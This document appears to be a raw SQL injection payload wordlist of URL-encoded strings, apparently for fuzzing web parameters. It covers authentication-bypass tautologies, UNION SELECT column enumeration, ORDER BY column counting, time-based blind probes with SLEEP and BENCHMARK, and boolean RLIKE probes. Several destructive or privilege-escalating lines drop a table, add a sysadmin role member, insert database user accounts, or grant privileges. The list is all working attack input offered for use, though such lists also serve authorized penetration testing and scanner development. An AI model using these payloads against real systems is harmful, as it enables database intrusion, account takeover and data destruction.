'%20;%20drop%20table%20temp%20--
'%20||%20myappadmin.adduser('admin',%20'newpass')%20||%20'
%20AND%205650%3DCONVERT(INT,(UNION%20ALL%20SELECTCHAR(88)%2BCHAR(88)))
%20AND%205650%3DCONVERT(INT,(UNION%20ALL%20SELECTCHAR(88)%2BCHAR(88)))--%20
%20AND%205650%3DCONVERT(INT,(UNION%20ALL%20SELECTCHAR(88)%2BCHAR(88)))%23
%20AND%205650%3DCONVERT(INT,(UNION%20ALL%20SELECTCHAR(88)%2BCHAR(88)%2BCHAR(88)))
%20AND%205650%3DCONVERT(INT,(UNION%20ALL%20SELECTCHAR(88)%2BCHAR(88)%2BCHAR(88)))--%20
%20AND%205650%3DCONVERT(INT,(UNION%20ALL%20SELECTCHAR(88)%2BCHAR(88)%2BCHAR(88)))%23
%20AND%205650%3DCONVERT(INT,(UNION%20ALL%20SELECTCHAR(88)%2BCHAR(88)%2BCHAR(88)%2BCHAR(88)))
%20AND%205650%3DCONVERT(INT,(UNION%20ALL%20SELECTCHAR(88)%2BCHAR(88)%2BCHAR(88)%2BCHAR(88)))--%20
%20AND%205650%3DCONVERT(INT,(UNION%20ALL%20SELECTCHAR(88)%2BCHAR(88)%2BCHAR(88)%2BCHAR(88)))%23
%20AND%205650%3DCONVERT(INT,(UNION%20ALL%20SELECTCHAR(88)%2BCHAR(88)%2BCHAR(88)%2BCHAR(88)%2BCHAR(88)))
%20AND%205650%3DCONVERT(INT,(UNION%20ALL%20SELECTCHAR(88)%2BCHAR(88)%2BCHAR(88)%2BCHAR(88)%2BCHAR(88)))--%20
%20AND%205650%3DCONVERT(INT,(UNION%20ALL%20SELECTCHAR(88)%2BCHAR(88)%2BCHAR(88)%2BCHAR(88)%2BCHAR(88)))%23
%20AND%205650%3DCONVERT(INT,(UNION%20ALL%20SELECTCHAR(88)%2BCHAR(88)%2BCHAR(88)%2BCHAR(88)%2BCHAR(88)%2BCHAR(88)))
%20AND%205650%3DCONVERT(INT,(UNION%20ALL%20SELECTCHAR(88)%2BCHAR(88)%2BCHAR(88)%2BCHAR(88)%2BCHAR(88)%2BCHAR(88)))--%20
%20AND%205650%3DCONVERT(INT,(UNION%20ALL%20SELECTCHAR(88)%2BCHAR(88)%2BCHAR(88)%2BCHAR(88)%2BCHAR(88)%2BCHAR(88)))%23
%20AND%207300%3D7300%20AND%20('pKlZ'%3D'pKlY
%20AND%207300%3D7300%20AND%20('pKlZ'%3D'pKlZ
%20AND%207300%3D7300%20AND%20'pKlZ'%3D'pKlY
%20AND%207300%3D7300%20AND%20'pKlZ'%3D'pKlZ
%20AND%207506%3D9091%20AND%20(5913%3D5913
%20AND%207506%3D9091%20AND%20('5913%3D5913
%20AS%20INJECTX%20WHERE%201%3D1%20AND%201%3D0
%20AS%20INJECTX%20WHERE%201%3D1%20AND%201%3D0--
%20AS%20INJECTX%20WHERE%201%3D1%20AND%201%3D0%23
%20AS%20INJECTX%20WHERE%201%3D1%20AND%201%3D1
%20AS%20INJECTX%20WHERE%201%3D1%20AND%201%3D1--
%20AS%20INJECTX%20WHERE%201%3D1%20AND%201%3D1%23
'%20exec%20sp_addsrvrolemember%20'name'%20,%20'sysadmin'%20--
'%20grant%20connect%20to%20name;%20grant%20resource%20to%20name;%20--
%20HAVING%201%3D0
%20HAVING%201%3D0--%20
%20HAVING%201%3D0%23
%20HAVING%201%3D1
%20HAVING%201%3D1--%20
%20HAVING%201%3D1%23
'%20insert%20into%20mysql.user%20(user,%20host,%20password)%20values%20('name',%20'localhost',%20password('pass123'))%20--
'%20insert%20into%20users(login,%20password,%20level)%20values(%20char(0x70)%20%2B%20char(0x65)%20%2B%20char(0x74)%20%2B%20char(0x65)%20%2B%20char(0x72)%20%2B%20char(0x70)%20%2B%20char(0x65)%20%2B%20char(0x74)%20%2B%20char(0x65)%20%2B%20char(0x72),char(0x64)
%20OR%201%3D0
%20OR%201%3D0--%20
%20OR%201%3D0%23
%20OR%201%3D1
'%20or%20'1'%3D'1
%20OR%201%3D1--%20
'%20or%201%3D1%20--
%20OR%201%3D1%23
%20OR%203409%3D3409%20AND%20('pytW'%20LIKE%20'pytW
%20OR%203409%3D3409%20AND%20('pytW'%20LIKE%20'pytY
%20OR%20x%3Dx
%20OR%20x%3Dx--%20
%20OR%20x%3Dx%23
%20OR%20x%3Dy
%20OR%20x%3Dy--%20
%20OR%20x%3Dy%23
%20ORDER%20BY%201%20
%20ORDER%20BY%201--%20
%20ORDER%20BY%201%23%20
%20ORDER%20BY%201,SLEEP(5)
%20ORDER%20BY%201,SLEEP(5)--%20
%20ORDER%20BY%201,SLEEP(5)%23
%20ORDER%20BY%201,SLEEP(5),3--%20
%20ORDER%20BY%201,SLEEP(5),3%23
%20ORDER%20BY%201,SLEEP(5),3,4--%20
%20ORDER%20BY%201,SLEEP(5),3,4%23
%20ORDER%20BY%201,SLEEP(5),BENCHMARK(1000000,MD5('A'))
%20ORDER%20BY%201,SLEEP(5),BENCHMARK(1000000,MD5('A')),4
%20ORDER%20BY%201,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5
%20ORDER%20BY%201,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5--%20
%20ORDER%20BY%201,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5%23
%20ORDER%20BY%201,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6
%20ORDER%20BY%201,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6--%20
%20ORDER%20BY%201,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6%23
%20ORDER%20BY%201,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7
%20ORDER%20BY%201,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7--%20
%20ORDER%20BY%201,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7%23
%20ORDER%20BY%201,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8
%20ORDER%20BY%201,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8--%20
%20ORDER%20BY%201,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8%23
%20ORDER%20BY%201,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9
%20ORDER%20BY%201,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9--%20
%20ORDER%20BY%201,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9%23
%20ORDER%20BY%201,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10
%20ORDER%20BY%201,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10--%20
%20ORDER%20BY%201,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10%23
%20ORDER%20BY%201,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11
%20ORDER%20BY%201,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11--%20
%20ORDER%20BY%201,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11%23
%20ORDER%20BY%201,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12
%20ORDER%20BY%201,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12--%20
%20ORDER%20BY%201,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12%23
%20ORDER%20BY%201,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13
%20ORDER%20BY%201,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13--%20
%20ORDER%20BY%201,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13%23
%20ORDER%20BY%201,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14
%20ORDER%20BY%201,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14--%20
%20ORDER%20BY%201,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14%23
%20ORDER%20BY%201,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15
%20ORDER%20BY%201,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15--%20
%20ORDER%20BY%201,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15%23
%20ORDER%20BY%201,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16
%20ORDER%20BY%201,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16--%20
%20ORDER%20BY%201,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16%23
%20ORDER%20BY%201,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17
%20ORDER%20BY%201,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17--%20
%20ORDER%20BY%201,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17%23
%20ORDER%20BY%201,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18
%20ORDER%20BY%201,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18--%20
%20ORDER%20BY%201,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18%23
%20ORDER%20BY%201,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19
%20ORDER%20BY%201,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19--%20
%20ORDER%20BY%201,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19%23
%20ORDER%20BY%201,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20
%20ORDER%20BY%201,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--%20
%20ORDER%20BY%201,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20%23
%20ORDER%20BY%201,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21
%20ORDER%20BY%201,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21--%20
%20ORDER%20BY%201,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21%23
%20ORDER%20BY%201,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22
%20ORDER%20BY%201,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22--%20
%20ORDER%20BY%201,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22%23
%20ORDER%20BY%201,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23
%20ORDER%20BY%201,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23--%20
%20ORDER%20BY%201,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23%23
%20ORDER%20BY%201,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24
%20ORDER%20BY%201,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24--%20
%20ORDER%20BY%201,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24%23
%20ORDER%20BY%201,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25
%20ORDER%20BY%201,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25--%20
%20ORDER%20BY%201,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25%23
%20ORDER%20BY%201,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26
%20ORDER%20BY%201,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26--%20
%20ORDER%20BY%201,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26%23
%20ORDER%20BY%201,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27
%20ORDER%20BY%201,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27--%20
%20ORDER%20BY%201,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27%23
%20ORDER%20BY%201,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28
%20ORDER%20BY%201,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28--%20
%20ORDER%20BY%201,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28%23
%20ORDER%20BY%201,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29
%20ORDER%20BY%201,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29--%20
%20ORDER%20BY%201,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29%23
%20ORDER%20BY%201,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30
%20ORDER%20BY%201,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30--%20
%20ORDER%20BY%201,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30%23
%20ORDER%20BY%2010%20
%20ORDER%20BY%2010--%20
%20ORDER%20BY%2010%23%20
%20ORDER%20BY%2011%20
%20ORDER%20BY%2011--%20
%20ORDER%20BY%2011%23%20
%20ORDER%20BY%2012%20
%20ORDER%20BY%2012--%20
%20ORDER%20BY%2012%23%20
%20ORDER%20BY%2013%20
%20ORDER%20BY%2013--%20
%20ORDER%20BY%2013%23%20
%20ORDER%20BY%2014%20
%20ORDER%20BY%2014--%20
%20ORDER%20BY%2014%23%20
%20ORDER%20BY%2015%20
%20ORDER%20BY%2015--%20
%20ORDER%20BY%2015%23%20
%20ORDER%20BY%2016%20
%20ORDER%20BY%2016--%20
%20ORDER%20BY%2016%23%20
%20ORDER%20BY%2017%20
%20ORDER%20BY%2017--%20
%20ORDER%20BY%2017%23%20
%20ORDER%20BY%2018%20
%20ORDER%20BY%2018--%20
%20ORDER%20BY%2018%23%20
%20ORDER%20BY%2019%20
%20ORDER%20BY%2019--%20
%20ORDER%20BY%2019%23%20
%20ORDER%20BY%202%20
%20ORDER%20BY%202--%20
%20ORDER%20BY%202%23%20
%20ORDER%20BY%2020%20
%20ORDER%20BY%2020--%20
%20ORDER%20BY%2020%23%20
%20ORDER%20BY%2021%20
%20ORDER%20BY%2021--%20
%20ORDER%20BY%2021%23%20
%20ORDER%20BY%2022%20
%20ORDER%20BY%2022--%20
%20ORDER%20BY%2022%23%20
%20ORDER%20BY%2023%20
%20ORDER%20BY%2023--%20
%20ORDER%20BY%2023%23%20
%20ORDER%20BY%2024%20
%20ORDER%20BY%2024--%20
%20ORDER%20BY%2024%23%20
%20ORDER%20BY%2025%20
%20ORDER%20BY%2025--%20
%20ORDER%20BY%2025%23%20
%20ORDER%20BY%2026%20
%20ORDER%20BY%2026--%20
%20ORDER%20BY%2026%23%20
%20ORDER%20BY%2027%20
%20ORDER%20BY%2027--%20
%20ORDER%20BY%2027%23%20
%20ORDER%20BY%2028%20
%20ORDER%20BY%2028--%20
%20ORDER%20BY%2028%23%20
%20ORDER%20BY%2029%20
%20ORDER%20BY%2029--%20
%20ORDER%20BY%2029%23%20
%20ORDER%20BY%203%20
%20ORDER%20BY%203--%20
%20ORDER%20BY%203%23%20
%20ORDER%20BY%2030%20
%20ORDER%20BY%2030--%20
%20ORDER%20BY%2030%23
%20ORDER%20BY%2031337%20
%20ORDER%20BY%2031337--%20
%20ORDER%20BY%2031337%23
%20ORDER%20BY%204%20
%20ORDER%20BY%204--%20
%20ORDER%20BY%204%23%20
%20ORDER%20BY%205%20
%20ORDER%20BY%205--%20
%20ORDER%20BY%205%23%20
%20ORDER%20BY%206%20
%20ORDER%20BY%206--%20
%20ORDER%20BY%206%23%20
%20ORDER%20BY%207%20
%20ORDER%20BY%207--%20
%20ORDER%20BY%207%23%20
%20ORDER%20BY%208%20
%20ORDER%20BY%208--%20
%20ORDER%20BY%208%23%20
%20ORDER%20BY%209%20
%20ORDER%20BY%209--%20
%20ORDER%20BY%209%23%20
%20ORDER%20BY%20SLEEP(5)
%20ORDER%20BY%20SLEEP(5)--%20
%20ORDER%20BY%20SLEEP(5)%23
%20RLIKE%20(SELECT%20(CASE%20WHEN%20(4346%3D4346)%20THEN%200x61646d696e%20ELSE%200x28%20END))%20AND%20'Txws'%3D'
%20RLIKE%20(SELECT%20(CASE%20WHEN%20(4346%3D4347)%20THEN%200x61646d696e%20ELSE%200x28%20END))%20AND%20'Txws'%3D'
'%20union%20(select%20@@version)%20--
'%20union%20(select%20NULL,%20(select%20@@version))%20--
'%20union%20(select%20NULL,%20NULL,%20(select%20@@version))%20--
'%20union%20(select%20NULL,%20NULL,%20NULL,%20%20(select%20@@version))%20--
'%20union%20(select%20NULL,%20NULL,%20NULL,%20NULL,%20%20(select%20@@version))%20--
'%20union%20(select%20NULL,%20NULL,%20NULL,%20NULL,%20%20NULL,%20(select%20@@version))%20--
%20UNION%20ALL%20SELECT%20@@VERSION,USER(),SLEEP(5)--%20
%20UNION%20ALL%20SELECT%20@@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A'))--%20
%20UNION%20ALL%20SELECT%20@@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL--%20
%20UNION%20ALL%20SELECT%20@@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL--%20
%20UNION%20ALL%20SELECT%20@@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL--%20
%20UNION%20ALL%20SELECT%20@@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL--%20
%20UNION%20ALL%20SELECT%20@@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL--%20
%20UNION%20ALL%20SELECT%20@@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL--%20
%20UNION%20ALL%20SELECT%20@@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL--%20
%20UNION%20ALL%20SELECT%20@@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--%20
%20UNION%20ALL%20SELECT%20@@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--%20
%20UNION%20ALL%20SELECT%20@@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--%20
%20UNION%20ALL%20SELECT%20@@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--%20
%20UNION%20ALL%20SELECT%20@@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--%20
%20UNION%20ALL%20SELECT%20@@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--%20
%20UNION%20ALL%20SELECT%20@@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--%20
%20UNION%20ALL%20SELECT%20@@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--%20
%20UNION%20ALL%20SELECT%20@@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--%20
%20UNION%20ALL%20SELECT%20@@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--%20
%20UNION%20ALL%20SELECT%20@@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--%20
%20UNION%20ALL%20SELECT%20@@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--%20
%20UNION%20ALL%20SELECT%20@@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--%20
%20UNION%20ALL%20SELECT%20@@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--%20
%20UNION%20ALL%20SELECT%20@@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--%20
%20UNION%20ALL%20SELECT%20@@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--%20
%20UNION%20ALL%20SELECT%20@@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--%20
%20UNION%20ALL%20SELECT%20@@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--%20
%20UNION%20ALL%20SELECT%201
%20UNION%20ALL%20SELECT%201--%20
%20UNION%20ALL%20SELECT%201%23
%20UNION%20ALL%20SELECT%201,2
%20UNION%20ALL%20SELECT%201,2--%20
%20UNION%20ALL%20SELECT%201,2%23
%20UNION%20ALL%20SELECT%201,2,3
%20UNION%20ALL%20SELECT%201,2,3--%20
%20UNION%20ALL%20SELECT%201,2,3%23
%20UNION%20ALL%20SELECT%201,2,3,4
%20UNION%20ALL%20SELECT%201,2,3,4--%20
%20UNION%20ALL%20SELECT%201,2,3,4%23
%20UNION%20ALL%20SELECT%201,2,3,4,5
%20UNION%20ALL%20SELECT%201,2,3,4,5--%20
%20UNION%20ALL%20SELECT%201,2,3,4,5%23
%20UNION%20ALL%20SELECT%201,2,3,4,5,6
%20UNION%20ALL%20SELECT%201,2,3,4,5,6--%20
%20UNION%20ALL%20SELECT%201,2,3,4,5,6%23
%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7
%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7--%20
%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7%23
%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7,8
%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7,8--%20
%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7,8%23
%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7,8,9
%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7,8,9--%20
%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7,8,9%23
%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7,8,9,10
%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7,8,9,10--%20
%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7,8,9,10%23
%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7,8,9,10,11
%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7,8,9,10,11--%20
%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7,8,9,10,11%23
%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12
%20UNION%20ALL%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12--%20
